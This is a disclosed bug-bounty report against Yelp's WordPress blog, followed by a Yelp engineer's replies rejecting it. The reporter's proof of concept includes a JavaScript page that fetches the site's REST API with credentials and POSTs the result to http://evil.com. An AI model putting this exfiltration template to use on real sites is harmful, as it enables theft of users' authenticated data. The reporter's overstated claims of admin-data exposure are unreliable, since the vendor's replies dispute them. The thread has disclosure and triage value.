title: Multiple Vulnerabilities in (*.blog.yelp.com) - Leakage user admin Sensitive Exposure

profile.name: Yelp
profile.about: Connecting people to great local businesses in communities around the world.

vulnerability_information_html:
Hi! Team @yelp, We Found Multiple Vulnerabilities in you websites , Username Admin Login Sensitive Exposure
Refferals Hackerone [#753725]

Platform(s) Affected: [website]
*. https://blog.yelp.com/wp-json/ user-admin sensitive exposure
*. https://blog.yelp.com/wp-login.php Admin-Page disclousure

Steps To Reproduce:

1) Open URL Vulnerable : https://blog.yelp.com/wp-json/
Request

GET /wp-json/ HTTP/1.1
Host: blog.yelp.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: http://127.0.0.1:8080
DNT: 1
Connection: close
Cookie: __cfduid=dc46e8e6b98de504f3f044d1b9b3b8a191579632970
Upgrade-Insecure-Requests: 1

Vulnerable Details
Add Parameter Origin in Request Header
Origin http://127.0.0.1:8080
Exploit Cross Origin Resource Sharing Misconfiguration

<!DOCTYPE html>
<html>
<body>
<center>
<h3>Steal customer data!</h3>
<html>
<body>
<button type='button' onclick='cors()'>Exploit</button>
<p id='demo'></p>
<script>
function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
var a = this.responseText; // Sensitive data from blog.yelp.com about user account
document.getElementById("demo").innerHTML = a;
xhttp.open("POST", "http://evil.com", true);// Sending that data to Attacker's website
xhttp.withCredentials = true;
console.log(a);
xhttp.send("data="+a);
}
};
xhttp.open("GET", "https://blog.yelp.com/wp-json/", true);
xhttp.withCredentials = true;
xhttp.send();
}
</script>
</body>
</html>

2) save file as .html , and open in your browser
3) Boom Sensitive has been Exposure

POC Screenshots/Videos:

  • ScreenshotsYelpPOC1.png (F691740)
  • ScreenshotsYelpPOC2.png (F691742)
  • ScreenshotsYelpPOC.png (F691741)

Impact

  1. This website using Wordpress , so developer forget to disable the link that can view information of admin user. By access to this link, attacker can get all username and other information of user admin: Wordpress user admin sensitive-exposure
  2. Cross Origin Resource Sharing Misconfiguration

activities.message:
**Hi!** Team security @yelp,
We can get information about the users registered (such as: id, name, login name, etc.) and employees of Yelp without authentication on

activities.message:
HI @bellpwn,

Can you elaborate more on the perceived risk of the issues?

The existence of an admin login page by itself does not carry any risk. 

The contents of our Wordpress blog are intended to be public. The Wordpress API includes the use of nonces / CSRF tokens for state changing requests. The inclusion of the request origin in the `Access-Control-Allow-Origin` header is by design. I assume your instructions on adding `Origin` to the request are a way of simulating a page served from a web server since a normal XHR request can't set that.

https://developer.wordpress.org/rest-api/frequently-asked-questions/#why-is-the-rest-api-not-verifying-the-incoming-origin-header-does-this-expose-my-site-to-csrf-attacks

https://github.com/WordPress/WordPress/blob/cf249b07ed0517240ed61656bc340e271ba33a0c/wp-includes/rest-api.php#L580

David
activities.markdown_message:

The contents of our Wordpress blog are intended to be public. The Wordpress API includes the use of nonces / CSRF tokens for state changing requests. The inclusion of the request origin in the Access-Control-Allow-Origin header is by design. I assume your instructions on adding Origin to the request are a way of simulating a page served from a web server since a normal XHR request can't set that.

https://developer.wordpress.org/rest-api/frequently-asked-questions/#why-is-the-rest-api-not-verifying-the-incoming-origin-header-does-this-expose-my-site-to-csrf-attacks

https://github.com/WordPress/WordPress/blob/cf249b07ed0517240ed61656bc340e271ba33a0c/wp-includes/rest-api.php#L580

David

activities.message:
**Hi!** Security Team @dchan ,
Wordpress User Admin Disclousure & Wordpress restApi Disclousure in ``WP-JSON``
attacker can leads to **CORS-Exploit** with sensitive information 

POC 1 : F691742
POC 2: F698578
activities.markdown_message:
Hi! Security Team @dchan ,
Wordpress User Admin Disclousure & Wordpress restApi Disclousure in WP-JSON
attacker can leads to CORS-Exploit with sensitive information

POC 1 : ScreenshotsYelpPOC2.png (F691742)
POC 2: POC2.png (F698578)

activities.message:
Hi @android_security,

Thanks for providing screenshots. We understand that the Wordpress REST API is publicly available. However an attacker can manually curl the endpoint and receive unauthenticated information. The additional threat vector would be if you can convince an authenticated user to visit your page and perform the CORS attack.

What specific sensitive non-public data do you believe is available from the API?

We use roles to limit the permissions of our contributors / authors
https://wordpress.org/support/article/roles-and-capabilities/

We don't believe the existence of the `wp-login.php` endpoint is a vulnerability. Mitigations such as rate-limiting and single sign on reduce the risk for the login endpoint.

David
activities.markdown_message:
Hi @android_security,

Thanks for providing screenshots. We understand that the Wordpress REST API is publicly available. However an attacker can manually curl the endpoint and receive unauthenticated information. The additional threat vector would be if you can convince an authenticated user to visit your page and perform the CORS attack.

What specific sensitive non-public data do you believe is available from the API?

We use roles to limit the permissions of our contributors / authors
https://wordpress.org/support/article/roles-and-capabilities/

We don't believe the existence of the wp-login.php endpoint is a vulnerability. Mitigations such as rate-limiting and single sign on reduce the risk for the login endpoint.

David

activities.message: User admin disclousure in & CORS Misconfig in this url.
activities.markdown_message: User admin disclousure in & CORS Misconfig in this url.

activities.message:
Hi @android_security,

To reiterate, the existence of the login page is a known risk and mitigated through other mechanisms. I do not see any disclosure of the admin user in the screenshots. We use single-sign-on for the blog.

We know about Wordpress adding the `Origin` to the CORS headers and don't believe this has meaningful impact for our use case. 

Please re-open if there is some fact that we're missing.

David
activities.markdown_message:
Hi @android_security,

To reiterate, the existence of the login page is a known risk and mitigated through other mechanisms. I do not see any disclosure of the admin user in the screenshots. We use single-sign-on for the blog.

We know about Wordpress adding the Origin to the CORS headers and don't believe this has meaningful impact for our use case.

Please re-open if there is some fact that we're missing.

David

Disclosing as requested. Thanks for participating in our program.

David
